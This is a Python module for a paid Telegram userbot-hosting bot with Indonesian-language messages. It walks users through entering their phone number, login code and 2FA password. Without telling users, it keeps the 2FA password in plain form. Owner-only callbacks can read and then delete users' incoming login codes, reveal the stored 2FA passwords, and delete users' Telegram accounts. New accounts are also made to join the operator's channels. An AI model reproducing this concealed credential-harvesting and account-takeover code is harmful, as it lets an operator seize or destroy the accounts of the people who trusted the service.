import asyncio
import importlib
from datetime import datetime

from pyrogram.enums import SentCodeType
from pyrogram.errors import *
from pyrogram.types import *
from pyrogram.raw import functions

from PyroUbot import *


@PY.BOT("start")
@PY.START
@PY.PRIVATE
async def start_handler(client, message):
    user_id = message.from_user.id
    from PyroUbot.core.helpers.inline import BTN
    from PyroUbot.core.helpers.text import MSG
    buttons = BTN.START(message)
    msg = MSG.START(message)
    pantek = "https://i.imgur.com/7BTzIeo.png"

    await bot.send_photo(
        user_id,
        pantek,
        caption=msg,
        reply_markup=InlineKeyboardMarkup(buttons) if buttons else None,
    )


@PY.CALLBACK("^home")
async def home_callback(client, callback_query):
    user_id = callback_query.from_user.id
    from PyroUbot.core.helpers.inline import BTN
    from PyroUbot.core.helpers.text import MSG
    pantek = "https://i.imgur.com/7BTzIeo.png"

    try:
        await callback_query.message.delete()
        await bot.send_photo(
            user_id,
            pantek,
            caption=MSG.START(callback_query),
            reply_markup=InlineKeyboardMarkup(BTN.START(callback_query)),
        )
    except Exception:
        await callback_query.edit_message_text(
            MSG.START(callback_query),
            reply_markup=InlineKeyboardMarkup(BTN.START(callback_query)),
        )


@PY.CALLBACK("buat_ubot")
async def buat_ubot_callback(client, callback_query):
    user_id = callback_query.from_user.id

    if user_id in ubot._get_my_id:
        return await callback_query.edit_message_text(
            "<blockquote><b>⌬ Kamu udah punya userbot aktif!</b>\n\n"
            "Kalo ubotnya ga respon, coba restart dulu ya.</blockquote>",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⟳ Restart", callback_data="ress_ubot")],
                [InlineKeyboardButton("← Kembali", callback_data=f"home {user_id}")],
            ]),
        )

    if len(ubot._ubot) + 1 > MAX_BOT:
        return await callback_query.edit_message_text(
            f"<blockquote><b>⌭ Slot userbot penuh!</b>\n\n"
            f"Kapasitas: {len(ubot._ubot)} userbot sudah tercapai.\n"
            f"Hubungi <a href='tg://openmessage?user_id={OWNER_ID}'>Owner</a> ya!</blockquote>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← Kembali", callback_data=f"home {user_id}")]]),
        )

    premium_users = await get_list_from_vars(client.me.id, "PREM_USERS")
    ultra_premium_users = await get_list_from_vars(client.me.id, "ULTRA_PREM")

    if user_id not in premium_users and user_id not in ultra_premium_users:
        return await callback_query.edit_message_text(
            "<blockquote><b>⌭ Kamu belum beli akses userbot!</b>\n\n"
            "Beli dulu baru bisa buat userbot ya </blockquote>",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("⊕ Beli Sekarang", callback_data="bahan")],
                [InlineKeyboardButton("← Kembali", callback_data=f"home {user_id}")],
            ]),
        )

    return await callback_query.edit_message_text(
        "<blockquote><b>⌬ Siap bikin userbot!</b>\n\n"
        "<b>Yang perlu kamu siapin:</b>\n"
        "<b>•</b> Nomor HP Telegram kamu (format: +62xxx)\n\n"
        "<b>Kalau udah siap, klik lanjutkan!</b></blockquote>",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⌬ Lanjutkan", callback_data="add_ubot")]]),
    )



@PY.CALLBACK("add_ubot")
async def add_ubot_callback(client, callback_query):
    user_id = callback_query.from_user.id
    await callback_query.message.delete()

    try:
        phone = await bot.ask(
            user_id,
            "<blockquote><b>◉ Masukkan nomor HP Telegram kamu</b>\n\n"
            "<b>Format:</b> <code>+62xxxxxxxxx</code>\n\n"
            "Gunakan <code>/cancel</code> buat batalin proses.</blockquote>",
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(
            user_id,
            "<blockquote><b>◷ Timeout! Proses dibatalin otomatis.</b>\n\nKetik /start buat mulai lagi.</blockquote>"
        )

    if await is_cancel(callback_query, phone.text):
        return

    phone_number = phone.text.strip()
    new_client = Ubot(
        name=str(callback_query.id),
        api_id=API_ID,
        api_hash=API_HASH,
        in_memory=False,
    )

    get_otp = await bot.send_message(
        user_id,
        "<blockquote><b>⊼ Lagi ngirim kode OTP...</b></blockquote>"
    )

    await new_client.connect()

    try:
        code = await new_client.send_code(phone_number)
    except ApiIdInvalid:
        await get_otp.delete()
        return await bot.send_message(user_id, "<blockquote><b>⌭ API ID tidak valid!</b></blockquote>")
    except PhoneNumberInvalid:
        await get_otp.delete()
        return await bot.send_message(user_id, "<blockquote><b>⌭ Nomor HP tidak valid!</b></blockquote>")
    except PhoneNumberFlood:
        await get_otp.delete()
        return await bot.send_message(user_id, "<blockquote><b>⌭ Nomor kena flood wait, coba lagi nanti!</b></blockquote>")
    except PhoneNumberBanned:
        await get_otp.delete()
        return await bot.send_message(user_id, "<blockquote><b>⌭ Nomor ini kena banned Telegram!</b></blockquote>")
    except PhoneNumberUnoccupied:
        await get_otp.delete()
        return await bot.send_message(user_id, "<blockquote><b>⌭ Nomor belum terdaftar di Telegram!</b></blockquote>")
    except Exception as error:
        await get_otp.delete()
        return await bot.send_message(user_id, f"<blockquote><b>⌭ Error:</b> {error}</blockquote>")

    await get_otp.delete()

    try:
        otp = await bot.ask(
            user_id,
            "<blockquote><b>⌠ Masukkan kode OTP kamu</b>\n\n"
            "Cek OTP dari akun resmi Telegram (@777000).\n"
            "<b>Format:</b> Kalau OTP-nya <code>12345</code> → kirim jadi <code>1 2 3 4 5</code>\n\n"
            "Gunakan <code>/cancel</code> buat batalin.</blockquote>",
            timeout=300,
        )
    except asyncio.TimeoutError:
        return await bot.send_message(
            user_id,
            "<blockquote><b>◷ Timeout! Proses dibatalin otomatis.</b>\n\nKetik /start buat mulai lagi.</blockquote>"
        )

    if await is_cancel(callback_query, otp.text):
        return

    otp_code = otp.text.strip()

    try:
        await new_client.sign_in(
            phone_number,
            code.phone_code_hash,
            phone_code=" ".join(str(otp_code)),
        )
    except PhoneCodeInvalid:
        return await bot.send_message(user_id, "<blockquote><b>⌭ Kode OTP salah!</b></blockquote>")
    except PhoneCodeExpired:
        return await bot.send_message(user_id, "<blockquote><b>⌭ Kode OTP udah expired! Coba lagi.</b></blockquote>")
    except BadRequest as error:
        return await bot.send_message(user_id, f"<blockquote><b>⌭ Error:</b> {error}</blockquote>")
    except SessionPasswordNeeded:
        try:
            two_step_code = await bot.ask(
                user_id,
                "<blockquote><b>⌠ Akun kamu ada 2FA!</b>\n\nMasukkan password 2FA kamu.\n\n"
                "Gunakan <code>/cancel</code> buat batalin.</blockquote>",
                timeout=300,
            )
        except asyncio.TimeoutError:
            return await bot.send_message(
                user_id,
                "<blockquote><b>◷ Timeout! Proses dibatalin otomatis.</b></blockquote>"
            )

        if await is_cancel(callback_query, two_step_code.text):
            return

        try:
            await new_client.check_password(two_step_code.text.strip())
            await set_two_factor(user_id, two_step_code.text.strip())
        except Exception as error:
            return await bot.send_message(user_id, f"<blockquote><b>⌭ Password 2FA salah:</b> {error}</blockquote>")

    session_string = await new_client.export_session_string()
    await new_client.disconnect()
    new_client.storage.session_string = session_string
    new_client.in_memory = False

    bot_msg = await bot.send_message(
        user_id,
        "<blockquote><b>⌘ Lagi proses aktivasi, tunggu sebentar ya...</b></blockquote>",
    )

    await new_client.start()

    if user_id != new_client.me.id:
        ubot._ubot.remove(new_client)
        return await bot_msg.edit(
            "<blockquote><b>⌭ Nomor HP harus nomor akun Telegram kamu sendiri!</b>\n\n"
            "Jangan pakai nomor orang lain ya.</blockquote>"
        )

    await add_ubot(
        user_id=int(new_client.me.id),
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session_string,
    )

    for mod in loadModule():
        importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))

    SH = await ubot.get_prefix(new_client.me.id)

    await bot_msg.edit(
        f"<blockquote><b>✧ Userbot Berhasil Diaktifkan!</b>\n\n"
        f"<b>Nama:</b> <a href='tg://user?id={new_client.me.id}'>"
        f"{new_client.me.first_name} {new_client.me.last_name or ''}</a>\n"
        f"<b>ID:</b> <code>{new_client.me.id}</code>\n"
        f"<b>Prefix:</b> <code>{' '.join(SH)}</code>\n\n"
        f"<b>Join channel:</b> @AllTestiRanzxyy biar tetap update!\n"
        f"<b>Kalau bot ga respon, ketik /restart</b></blockquote>",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← Kembali", callback_data=f"home {user_id}")]]),
    )

    await bash("rm -rf *session*")
    await install_my_peer(new_client)

    try:
        await new_client.join_chat("AllTestiRanzxyy")
        await new_client.join_chat("AboutRanzxyPedia")
    except UserAlreadyParticipant:
        pass

    await bot.send_message(
        LOGS_MAKER_UBOT,
        f"<blockquote><b>⟶ Userbot Baru Diaktifkan!</b>\n\n"
        f"<b>Akun:</b> <a href='tg://user?id={new_client.me.id}'>"
        f"{new_client.me.first_name} {new_client.me.last_name or ''}</a>\n"
        f"<b>ID:</b> <code>{new_client.me.id}</code></blockquote>",
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("◷ Cek Masa Aktif", callback_data=f"cek_masa_aktif {new_client.me.id}")
        ]]),
    )



async def is_cancel(callback_query, text):
    if text and text.strip().startswith("/cancel"):
        await bot.send_message(
            callback_query.from_user.id,
            "<blockquote><b>⊘ Proses dibatalin!</b>\n\nKetik /start buat mulai lagi.</blockquote>"
        )
        return True
    return False


@PY.BOT("control")
async def control_handler(client, message):
    await message.reply(
        "<blockquote><b>⌘ Kontrol Bot</b>\n\nMau restart userbot?</blockquote>",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⟳ Restart", callback_data="ress_ubot")]]),
    )


@PY.CALLBACK("ress_ubot")
async def ress_ubot_callback(client, callback_query):
    if callback_query.from_user.id not in ubot._get_my_id:
        return await callback_query.answer("Ini bukan buat kamu!", show_alert=True)

    for X in ubot._ubot:
        if callback_query.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        ubot._get_my_id.remove(X.me.id)
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
                        return await callback_query.edit_message_text(
                            f"<blockquote><b>⌬ Restart berhasil!</b>\n\n"
                            f"<b>Nama:</b> {UB.me.first_name} {UB.me.last_name or ''}\n"
                            f"<b>ID:</b> <code>{UB.me.id}</code></blockquote>"
                        )
                    except Exception as error:
                        return await callback_query.edit_message_text(
                            f"<blockquote><b>⌭ Restart gagal:</b> {error}</blockquote>"
                        )


@PY.BOT("restart")
async def restart_handler(client, message):
    msg = await message.reply("<blockquote><b>◷ Lagi restart...</b></blockquote>")

    if message.from_user.id not in ubot._get_my_id:
        return await msg.edit("<blockquote><b>⌭ Kamu ga punya akses buat ini!</b></blockquote>")

    for X in ubot._ubot:
        if message.from_user.id == X.me.id:
            for _ubot_ in await get_userbots():
                if X.me.id == int(_ubot_["name"]):
                    try:
                        ubot._ubot.remove(X)
                        ubot._get_my_id.remove(X.me.id)
                        UB = Ubot(**_ubot_)
                        await UB.start()
                        for mod in loadModule():
                            importlib.reload(importlib.import_module(f"PyroUbot.modules.{mod}"))
                        return await msg.edit(
                            f"<blockquote><b>⌬ Restart berhasil!</b>\n\n"
                            f"<b>Nama:</b> {UB.me.first_name} {UB.me.last_name or ''}\n"
                            f"<b>ID:</b> <code>{UB.me.id}</code></blockquote>"
                        )
                    except Exception as error:
                        return await msg.edit(
                            f"<blockquote><b>⌭ Restart gagal:</b> {error}</blockquote>"
                        )


@PY.CALLBACK("cek_ubot")
@PY.BOT("getubot")
@PY.ADMIN
async def cek_ubot_callback(client, callback_query):
    from PyroUbot.core.helpers.text import MSG
    from PyroUbot.core.helpers.inline import BTN
    await bot.send_message(
        callback_query.from_user.id,
        await MSG.UBOT(0),
        reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[0].me.id, 0)),
    )


@PY.CALLBACK("cek_masa_aktif")
async def cek_masa_aktif_callback(client, callback_query):
    user_id = int(callback_query.data.split()[1])
    expired = await get_expired_date(user_id)
    try:
        xxxx = (expired - datetime.now()).days
        return await callback_query.answer(f"◷ Sisa {xxxx} hari lagi", show_alert=True)
    except Exception:
        return await callback_query.answer("⌬ ga ada masa aktif / sudah expired", show_alert=True)


@PY.CALLBACK("del_ubot")
async def del_ubot_callback(client, callback_query):
    user_id = callback_query.from_user.id
    admin_list = await get_list_from_vars(client.me.id, "ADMIN_USERS")

    if user_id not in admin_list:
        return await callback_query.answer(
            f"⌭ Ini bukan buat kamu, {callback_query.from_user.first_name}!",
            show_alert=True,
        )

    try:
        show = await bot.get_users(callback_query.data.split()[1])
        get_id = show.id
        get_mention = f"{get_id}"
    except Exception:
        get_id = int(callback_query.data.split()[1])
        get_mention = f"{get_id}"

    for X in ubot._ubot:
        if get_id == X.me.id:
            await X.unblock_user(bot.me.username)
            await remove_ubot(X.me.id)
            ubot._get_my_id.remove(X.me.id)
            ubot._ubot.remove(X)
            await X.log_out()

            from PyroUbot.core.helpers.text import MSG
            from PyroUbot.core.helpers.inline import BTN

            await callback_query.answer(f"⌬ {get_mention} sukses dihapus!", show_alert=True)
            await callback_query.edit_message_text(
                await MSG.UBOT(0),
                reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[0].me.id, 0)),
            )
            await bot.send_message(
                X.me.id,
                MSG.EXP_MSG_UBOT(X),
                reply_markup=InlineKeyboardMarkup(BTN.EXP_UBOT()),
            )


@PY.CALLBACK("^(p_ub|n_ub)")
async def nav_ubot_callback(client, callback_query):
    from PyroUbot.core.helpers.text import MSG
    from PyroUbot.core.helpers.inline import BTN
    query = callback_query.data.split()
    count = int(query[1])
    if query[0] == "n_ub":
        count = 0 if count == len(ubot._ubot) - 1 else count + 1
    elif query[0] == "p_ub":
        count = len(ubot._ubot) - 1 if count == 0 else count - 1
    await callback_query.edit_message_text(
        await MSG.UBOT(count),
        reply_markup=InlineKeyboardMarkup(BTN.UBOT(ubot._ubot[count].me.id, count)),
    )


@PY.CALLBACK("^(get_otp|get_phone|get_faktor|ub_deak|deak_akun)")
async def tools_userbot_callback(client, callback_query):
    from PyroUbot.core.helpers.inline import BTN
    user_id = callback_query.from_user.id
    query = callback_query.data.split()

    if user_id != OWNER_ID:
        return await callback_query.answer(
            f"⌭ Ini bukan buat kamu, {callback_query.from_user.first_name}!",
            show_alert=True,
        )

    X = ubot._ubot[int(query[1])]

    if query[0] == "get_otp":
        async for otp in X.search_messages(777000, limit=1):
            try:
                if not otp.text:
                    await callback_query.answer("⌭ Kode OTP ga ketemu", show_alert=True)
                else:
                    await callback_query.edit_message_text(
                        otp.text,
                        reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
                    )
                    await X.delete_messages(X.me.id, otp.id)
            except Exception as error:
                return await callback_query.answer(str(error), show_alert=True)

    elif query[0] == "get_phone":
        return await callback_query.edit_message_text(
            f"<blockquote><b>◉ Nomor telepon untuk ID <code>{X.me.id}</code>:</b>\n"
            f"<code>{X.me.phone_number}</code></blockquote>",
            reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
        )

    elif query[0] == "get_faktor":
        code = await get_two_factor(X.me.id)
        if code is None:
            return await callback_query.answer("⌠ Kode 2FA ga ketemu", show_alert=True)
        return await callback_query.edit_message_text(
            f"<blockquote><b>⌠ Password 2FA untuk ID <code>{X.me.id}</code>:</b>\n"
            f"<code>{code}</code></blockquote>",
            reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
        )

    elif query[0] == "ub_deak":
        return await callback_query.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup(BTN.DEAK(X.me.id, int(query[1])))
        )

    elif query[0] == "deak_akun":
        from PyroUbot.core.helpers.text import MSG
        ubot._ubot.remove(X)
        await X.invoke(functions.account.DeleteAccount(reason="deleted"))
        return await callback_query.edit_message_text(
            MSG.DEAK(X),
            reply_markup=InlineKeyboardMarkup(BTN.UBOT(X.me.id, int(query[1]))),
        )
